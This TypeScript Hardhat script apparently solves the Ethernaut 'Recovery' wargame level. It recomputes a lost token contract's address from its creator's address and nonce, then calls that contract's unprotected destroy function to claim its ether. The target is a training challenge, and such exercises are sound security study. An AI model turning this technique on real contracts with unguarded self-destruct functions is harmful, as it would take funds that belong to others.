import { Signer, Contract } from 'ethers'
import { ethers } from 'hardhat'
import { SimpleToken, SimpleToken__factory } from '../typechain-types'
import { Recovery } from '../typechain-types/Recovery'
import { loadOrCreateLevelInstance, submitLevelInstance } from './ethernaut'
import { loadOrDeployContract } from './helpers'

const levelAddress = '0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2'

const main = async () => {
  const signer = (await ethers.getSigners())[0] as Signer

  const targetContract = (await loadOrCreateLevelInstance('Recovery', levelAddress, signer, {
    gasLimit: 3000000,
    value: ethers.utils.parseEther('0.001'),
  })) as Recovery

  const tokenAddress = ethers.utils.hexDataSlice(
    ethers.utils.keccak256(ethers.utils.RLP.encode([targetContract.address, '0x01'])),
    12,
    32,
  )

  const tokenContract = new SimpleToken__factory().attach(tokenAddress).connect(signer)

  const tx = await tokenContract.destroy(await signer.getAddress())
  console.log(`tx hash ${tx.hash}`)
  await tx.wait()

  await submitLevelInstance(targetContract.address, signer)
}

main()
  .then(() => process.exit())
  .catch(e => {
    console.error(e)
    process.exit(1)
  })
